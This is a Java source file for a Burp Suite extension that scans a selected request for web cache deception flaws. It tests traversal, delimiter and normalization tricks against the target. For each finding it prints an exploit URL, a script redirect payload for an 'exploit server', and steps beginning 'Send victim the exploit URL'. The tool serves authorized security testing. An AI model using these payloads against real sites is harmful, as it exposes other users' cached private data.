package burp;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintStream;
import java.util.*;
import java.util.concurrent.*;

/**
 * @author J Snyman
 * @author T Secker
 */
public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtensionStateListener {

    private final static float VERSION = 1.4f;

    private static IBurpExtenderCallbacks callbacks;
    private static IExtensionHelpers helpers;
    private static ExecutorService executor;

    protected static IExtensionHelpers getHelpers() {
        return helpers;
    }

    protected static IBurpExtenderCallbacks getCallbacks() {
        return callbacks;
    }

    protected static void print(String str) {
        callbacks.printOutput(str);
    }

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks iBurpExtenderCallbacks) {
        callbacks = iBurpExtenderCallbacks;
        callbacks.setExtensionName("Web Cache Deception Scanner");
        callbacks.registerContextMenuFactory(this);
        callbacks.registerExtensionStateListener(this);
        callbacks.printOutput("Web Cache Deception Scanner Version " + VERSION);
        callbacks.printOutput("Original Author: Johan Snyman <jsnyman@trustwave.com>");
        callbacks.printOutput("Updated for Burp Community Edition by: atomiczsec <gavin@atomiczsec.net>");

        helpers = iBurpExtenderCallbacks.getHelpers();

        int threads = Math.max(2, Runtime.getRuntime().availableProcessors());
        executor = Executors.newFixedThreadPool(threads);
    }

    // Submit the scanning job to a shared thread pool so multiple requests can
    // be processed concurrently without spawning excessive threads.
    private void runScannerForRequest(IHttpRequestResponse iHttpRequestResponse) {
        if (executor != null && !executor.isShutdown()) {
            executor.submit(new ScannerThread(iHttpRequestResponse));
        } else {
            // Fallback if executor is not available
            new Thread(new ScannerThread(iHttpRequestResponse)).start();
        }
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation iContextMenuInvocation) {
        List<JMenuItem> items = new ArrayList<>();

        if (IContextMenuInvocation.CONTEXT_TARGET_SITE_MAP_TABLE == iContextMenuInvocation.getInvocationContext() ||
                IContextMenuInvocation.CONTEXT_TARGET_SITE_MAP_TREE == iContextMenuInvocation.getInvocationContext() ||
                IContextMenuInvocation.CONTEXT_PROXY_HISTORY == iContextMenuInvocation.getInvocationContext()) {
            IHttpRequestResponse[] arr = iContextMenuInvocation.getSelectedMessages();
            JMenuItem item = new JMenuItem("Web Cache Deception Test");
            MenuItemListener mil = new MenuItemListener(arr);
            item.addActionListener(mil);
            items.add(item);
        }
        return items;
    }

    class MenuItemListener implements ActionListener {
        private final IHttpRequestResponse[] arr;

        MenuItemListener(IHttpRequestResponse[] arr) {
            this.arr = arr;
        }

        @Override
        public void actionPerformed(ActionEvent e) {
            for (IHttpRequestResponse message : arr) {
                runScannerForRequest(message);
            }
        }
    }

    class ScannerThread implements Runnable {
        private IHttpRequestResponse reqRes;

        ScannerThread(IHttpRequestResponse reqRes) {
            this.reqRes = reqRes;
        }

        @Override
        public void run() {
            try {
                // Initial path mapping check
                if (!RequestSender.initialTest(reqRes)) {
                    print("Initial path mapping tests failed. Aborting further cache checks.");
                    return;
                }

                String randomSegment = reqRes.getComment();
                if (randomSegment == null || randomSegment.isEmpty()) {
                    randomSegment = "test";
                }

                String targetUrlStr = helpers.analyzeRequest(reqRes).getUrl().toString();
                print("\n--- Starting WCD Scan for " + reqRes.getHttpService().toString() + targetUrlStr + " ---");
                
                // Result storage
                Map<String, Set<String>> vulnerableDelimiterCombinations = new HashMap<>();
                Map<String, Map<String, String>> successfulNormalizationDetails = new HashMap<>();
                Map<String, String> successfulPrefixExploits = new HashMap<>();
                Map<String, String> successfulRelativeExploits = new HashMap<>();
                Map<String, String> successfulReverseTraversals = new HashMap<>();
                Map<String, Map<String, String>> successfulSelfRefExploits = new HashMap<>();
                boolean hashTraversalVulnerable = false;
                String successfulTraversalPath = null;

                // Test Self-Referential Normalization
                print("Testing Self-Referential Path Normalization...");
                List<String> targetRelativeSegments = Arrays.asList(
                    "resources/", "static/", "css/", "js/", "images/", "public/", "assets/",
                    "api/", "media/", "uploads/", "content/", "files/", "data/"
                );
                List<String> delimiters = Arrays.asList("?", "%3f", "%23", ";", "/", ".", ",", "@");
                
                for (String delimiter : delimiters) {
                    Map<String, String> successfulSegmentsForDelimiter = new HashMap<>();
                    for (String segment : targetRelativeSegments) {
                        if (RequestSender.testSelfReferentialNormalization(reqRes, delimiter, segment)) {
                            print("  [HIT] Self-Referential: Delimiter='" + delimiter + "', Segment='" + segment + "'");
                            successfulSegmentsForDelimiter.put(segment, "..%2f");
                            break;
                        }
                    }
                    if (!successfulSegmentsForDelimiter.isEmpty()) {
                        successfulSelfRefExploits.put(delimiter, successfulSegmentsForDelimiter);
                    }
                }

                // Test Hash Path Traversal
                print("Testing hash-based path traversal...");
                String[] traversalPatterns = {
                    "%2f%2e%2e%2f", "%2f..%2f", "%252f%252e%252e%252f", "/%2e%2e/", "%2f%2e%2e"
                };
                String[] resourcesForTraversal = {
                    "resources", "static", "css", "js", "images", "api", "public", "assets"
                };
                
                for (String traversalPattern : traversalPatterns) {
                    if (hashTraversalVulnerable) break;
                    for (String resource : resourcesForTraversal) {
                        if (RequestSender.testHashPathTraversal(reqRes, resource, traversalPattern)) {
                            hashTraversalVulnerable = true;
                            successfulTraversalPath = traversalPattern + resource;
                            print("  [HIT] Hash Path Traversal: %23" + successfulTraversalPath);
                            break;
                        }
                    }
                }

                // Test Delimiter + Extensions
                print("Testing Delimiter + Extensions...");
                List<String> allExtensions = new ArrayList<>(Arrays.asList(RequestSender.INITIAL_TEST_EXTENSIONS));
                allExtensions.addAll(Arrays.asList(RequestSender.OTHER_TEST_EXTENSIONS));

                for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                    for (String extension : allExtensions) {
                        if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
                            print("  [HIT] Delimiter+Extension: Delimiter='" + delimiter + "', Extension=." + extension);
                            vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
                        }
                    }
                }

                // Test Path Normalization
                print("Testing Path Normalization...");
                List<String> knownPaths = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PATHS);
                List<String> normalizationTemplates = Arrays.asList(RequestSender.NORMALIZATION_TEMPLATES);
                
                for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                    Map<String, String> successfulPathsForDelimiter = new HashMap<>();
                    for (String knownPath : knownPaths) {
                        for (String template : normalizationTemplates) {
                            if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
                                print("  [HIT] Normalization: Delimiter='" + delimiter + "', Template=" + template + ", Path=" + knownPath);
                                successfulPathsForDelimiter.put(knownPath, template);
                            }
                        }
                    }
                    if (!successfulPathsForDelimiter.isEmpty()) {
                        successfulNormalizationDetails.put(delimiter, successfulPathsForDelimiter);
                    }
                }

                // Test Relative Path Normalization
                print("Testing Relative Path Normalization...");
                String specificRelativePath = "%2f%2e%2e%2frobots.txt";
                for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                    if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
                        print("  [HIT] Relative Normalization: Delimiter='" + delimiter + "', Path=" + specificRelativePath);
                        successfulRelativeExploits.put(delimiter, specificRelativePath);
                    }
                }

                // Test Prefix Normalization
                print("Testing Prefix Normalization...");
                List<String> knownPrefixes = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PREFIXES);
                for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                    for (String prefix : knownPrefixes) {
                        if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
                            print("  [HIT] Prefix Normalization: Delimiter='" + delimiter + "', Prefix=" + prefix);
                            successfulPrefixExploits.put(delimiter, prefix);
                            break;
                        }
                    }
                }

                // Test Reverse Traversal
                print("Testing Reverse Path Traversal...");
                String[] reverseTraversalPaths = {
                    "/resources/", "/static/", "/assets/", "/css/", "/js/", "/images/", "/public/"
                };
                for (String cachePath : reverseTraversalPaths) {
                    if (RequestSender.testReverseTraversal(reqRes, cachePath)) {
                        print("  [HIT] Reverse Traversal: Path='" + cachePath + "'");
                        successfulReverseTraversals.put(cachePath, "");
                    }
                }

                // Report findings
                boolean anyHits = !successfulSelfRefExploits.isEmpty() || 
                                hashTraversalVulnerable || 
                                !vulnerableDelimiterCombinations.isEmpty() || 
                                !successfulNormalizationDetails.isEmpty() ||
                                !successfulPrefixExploits.isEmpty() ||
                                !successfulRelativeExploits.isEmpty() ||
                                !successfulReverseTraversals.isEmpty();

                if (anyHits) {
                    WebCacheIssue issue = new WebCacheIssue(reqRes);
                    // Set vulnerable extensions for the issue
                    Set<String> allVulnerableExtensions = new HashSet<>();
                    for (Set<String> extensions : vulnerableDelimiterCombinations.values()) {
                        allVulnerableExtensions.addAll(extensions);
                    }
                    if (!allVulnerableExtensions.isEmpty()) {
                        issue.setVulnerableExtensions(allVulnerableExtensions);
                    }
                    
                    print("\n+++ Web Cache Deception Vulnerability Found +++");
                    print("Target URL: " + issue.getUrl().toString());
                    
                    // Generate detailed exploit information
                    generateExploitDetails(reqRes, successfulSelfRefExploits, hashTraversalVulnerable, 
                                         successfulTraversalPath, vulnerableDelimiterCombinations, 
                                         successfulNormalizationDetails, successfulPrefixExploits, 
                                         successfulRelativeExploits, successfulReverseTraversals);
                    
                    callbacks.addScanIssue(issue);
                } else {
                    print("\n--- No Web Cache Deception Vulnerabilities Found ---");
                }

            } catch (Throwable t) {
                print("ERROR during scan: " + t.getMessage());
                t.printStackTrace(new PrintStream(callbacks.getStderr()));
            }
        }
        
        private void generateExploitDetails(IHttpRequestResponse reqRes, 
                                          Map<String, Map<String, String>> successfulSelfRefExploits,
                                          boolean hashTraversalVulnerable, String successfulTraversalPath,
                                          Map<String, Set<String>> vulnerableDelimiterCombinations,
                                          Map<String, Map<String, String>> successfulNormalizationDetails,
                                          Map<String, String> successfulPrefixExploits,
                                          Map<String, String> successfulRelativeExploits,
                                          Map<String, String> successfulReverseTraversals) {
            
            String baseUrl = helpers.analyzeRequest(reqRes).getUrl().toString();
            if (baseUrl.contains("?")) {
                baseUrl = baseUrl.substring(0, baseUrl.indexOf("?"));
            }
            
            print("\n=== EXPLOIT DETAILS ===");
            
            // Self-Referential Normalization Exploits (Highest Priority)
            if (!successfulSelfRefExploits.isEmpty()) {
                print("\n[HIGH PRIORITY] Self-Referential Path Normalization Exploit Found!");
                
                String firstDelim = successfulSelfRefExploits.keySet().iterator().next();
                Map<String, String> segmentMap = successfulSelfRefExploits.get(firstDelim);
                String segment = segmentMap.keySet().iterator().next();
                String traversalPattern = segmentMap.get(segment);
                
                // Extract target filename
                String targetPath = helpers.analyzeRequest(reqRes).getUrl().getPath();
                String targetFilename = extractFilename(targetPath);
                
                String exploitPath = segment + traversalPattern + targetFilename;
                String cacheBuster = RequestSender.generateRandomString(4);
                String exploitUrl = baseUrl + firstDelim + exploitPath + "?wcd=" + cacheBuster;
                
                print("  Vulnerability Type: Self-Referential Path Normalization");
                print("  Delimiter: '" + firstDelim + "'");
                print("  Intermediate Segment: '" + segment + "'");
                print("  Traversal Pattern: '" + traversalPattern + "'");
                print("  Target File: '" + targetFilename + "'");
                print("");
                print("  EXPLOIT URL: " + exploitUrl);
                print("");
                print("  EXPLOIT SERVER PAYLOAD:");
                print("  <script>document.location='" + exploitUrl + "'</script>");
                print("");
                print("  MANUAL TESTING STEPS:");
                print("  1. Send victim the exploit URL above");
                print("  2. Within 30 seconds, request: " + baseUrl + firstDelim + exploitPath + "?wcd=" + cacheBuster);
                print("  3. Check if cached sensitive content is returned");
                print("");
            }
            
            // Hash Path Traversal Exploits
            if (hashTraversalVulnerable && successfulTraversalPath != null) {
                print("\n[HIGH PRIORITY] Hash Path Traversal Exploit Found!");
                
                String cacheBuster = RequestSender.generateRandomString(4);
                String exploitUrl = baseUrl + "%23" + successfulTraversalPath + "?wcd=" + cacheBuster;
                
                print("  Vulnerability Type: Hash-based Path Traversal");
                print("  Traversal Path: " + successfulTraversalPath);
                print("");
                print("  EXPLOIT URL: " + exploitUrl);
                print("");
                print("  EXPLOIT SERVER PAYLOAD:");
                print("  <script>document.location='" + exploitUrl + "'</script>");
                print("");
                print("  MANUAL TESTING STEPS:");
                print("  1. Send victim the exploit URL above");
                print("  2. Within 30 seconds, request: " + exploitUrl);
                print("  3. Check if cached sensitive content is returned");
                print("");
            }
            
            // Relative Path Normalization Exploits
            if (!successfulRelativeExploits.isEmpty()) {
                print("\n[MEDIUM PRIORITY] Relative Path Normalization Exploit Found!");
                
                String firstDelim = successfulRelativeExploits.keySet().iterator().next();
                String relativePath = successfulRelativeExploits.get(firstDelim);
                String cacheBuster = RequestSender.generateRandomString(4);
                String exploitUrl = baseUrl + firstDelim + relativePath + "?wcd=" + cacheBuster;
                
                print("  Vulnerability Type: Relative Path Normalization");
                print("  Delimiter: '" + firstDelim + "'");
                print("  Relative Path: " + relativePath);
                print("");
                print("  EXPLOIT URL: " + exploitUrl);
                print("");
                print("  EXPLOIT SERVER PAYLOAD:");
                print("  <script>document.location='" + exploitUrl + "'</script>");
                print("");
            }
            
            // Delimiter + Extension Exploits
            if (!vulnerableDelimiterCombinations.isEmpty()) {
                print("\n[MEDIUM PRIORITY] Delimiter + Extension Exploits Found!");
                
                for (Map.Entry<String, Set<String>> entry : vulnerableDelimiterCombinations.entrySet()) {
                    String delimiter = entry.getKey();
                    Set<String> extensions = entry.getValue();
                    
                    for (String ext : extensions) {
                        String cacheBuster = RequestSender.generateRandomString(4);
                        String exploitUrl = baseUrl + delimiter + "test." + ext + "?wcd=" + cacheBuster;
                        
                        print("  Delimiter: '" + delimiter + "', Extension: ." + ext);
                        print("  EXPLOIT URL: " + exploitUrl);
                        print("  EXPLOIT PAYLOAD: <script>document.location='" + exploitUrl + "'</script>");
                        break; // Show only first extension per delimiter
                    }
                }
                print("");
            }
            
            // Prefix Normalization Exploits
            if (!successfulPrefixExploits.isEmpty()) {
                print("\n[MEDIUM PRIORITY] Prefix Normalization Exploits Found!");
                
                for (Map.Entry<String, String> entry : successfulPrefixExploits.entrySet()) {
                    String delimiter = entry.getKey();
                    String prefix = entry.getValue();
                    String normalizedPrefix = prefix.startsWith("/") ? prefix.substring(1) : prefix;
                    String cacheBuster = RequestSender.generateRandomString(4);
                    String exploitUrl = baseUrl + delimiter + "%2f%2e%2e%2f" + normalizedPrefix + "?wcd=" + cacheBuster;
                    
                    print("  Delimiter: '" + delimiter + "', Prefix: " + prefix);
                    print("  EXPLOIT URL: " + exploitUrl);
                    print("  EXPLOIT PAYLOAD: <script>document.location='" + exploitUrl + "'</script>");
                    break; // Show only first one
                }
                print("");
            }
            
            // Reverse Traversal Exploits
            if (!successfulReverseTraversals.isEmpty()) {
                print("\n[HIGH PRIORITY] Reverse Path Traversal Exploits Found!");
                
                String targetPath = helpers.analyzeRequest(reqRes).getUrl().getPath();
                String targetFilename = extractFilename(targetPath);
                
                for (Map.Entry<String, String> entry : successfulReverseTraversals.entrySet()) {
                    String cachePath = entry.getKey();
                    String cacheBuster = RequestSender.generateRandomString(4);
                    String exploitUrl = baseUrl.replace(targetPath, cachePath + "..%2f" + targetFilename) + "?wcd=" + cacheBuster;
                    
                    print("  Cache Path: " + cachePath);
                    print("  Target File: " + targetFilename);
                    print("  EXPLOIT URL: " + exploitUrl);
                    print("  EXPLOIT PAYLOAD: <script>document.location='" + exploitUrl + "'</script>");
                    break; // Show only first one
                }
                print("");
            }
        }
        
        private String extractFilename(String path) {
            if (path == null || path.isEmpty() || !path.startsWith("/")) {
                return "index";
            }
            
            int lastSlash = path.lastIndexOf('/');
            if (lastSlash == path.length() - 1 && path.length() > 1) {
                // Path ends with slash, get directory name
                int secondLastSlash = path.lastIndexOf('/', lastSlash - 1);
                return path.substring(secondLastSlash + 1, lastSlash);
            } else if (lastSlash == -1 || lastSlash == 0) {
                return "index";
            } else {
                return path.substring(lastSlash + 1);
            }
        }
    }

    @Override
    public void extensionUnloaded() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
}
